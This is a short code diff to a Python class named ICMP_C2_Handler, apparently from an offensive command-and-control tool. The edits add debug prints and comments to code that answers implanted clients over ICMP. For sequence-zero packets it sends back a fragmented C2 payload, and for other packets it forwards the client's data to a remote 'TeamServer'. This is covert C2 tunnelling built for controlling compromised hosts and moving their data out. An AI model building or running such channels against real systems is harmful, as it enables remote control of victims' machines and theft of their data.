@@ -48,7 +48,7 @@ class ICMP_C2_Handler:
 
     def recv_frame(self):
         raw_size = self.sock.recv(4)
-        print(f"TeamServer: {raw_size}")
+        print(f"Frame coming from TeamServer: {raw_size}")
         if len(raw_size) < 4:
             raise ConnectionError("Failed to receive frame size.")
         size = struct.unpack('<I', raw_size)[0]
@@ -63,6 +63,7 @@ class ICMP_C2_Handler:
         return buffer
 
     def send_frame(self, data: bytes):
+        print(f"Frame going to TeamServer: {data}")
         size = len(data)
         self.sock.sendall(struct.pack('<I', size))
         self.sock.sendall(data)
@@ -82,10 +83,12 @@ class ICMP_C2_Handler:
 
         payload_after_tag = raw_load[len(ICMP_TAG):]
 
+        # init packet check for sending payload
         if icmp_seq == 0:
             # Client’s size request; immediately reply with fragmented C2 payload
             total_size = int.from_bytes(payload_after_tag[:4], "big")
             print(f"[+] Client requested payload of {total_size} bytes")
+            # send payload back to client
             self.send_fragmented_icmp(
                 client_ip=ip_src,
                 client_icmp_id=icmp_id,
@@ -93,10 +96,11 @@ class ICMP_C2_Handler:
             )
             return
 
+        # if icmp_seq not 0, then send data to teamserver
         # seq > 0: forward to TeamServer as before…
         print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
         # NEED TO STRIP the \x00 here, otherwise team server breaks (encryption things & length)
-        print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
+        #print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
         self.send_frame(payload_after_tag.rstrip(b"\x00"))
         teamserver_response = self.recv_frame()
 
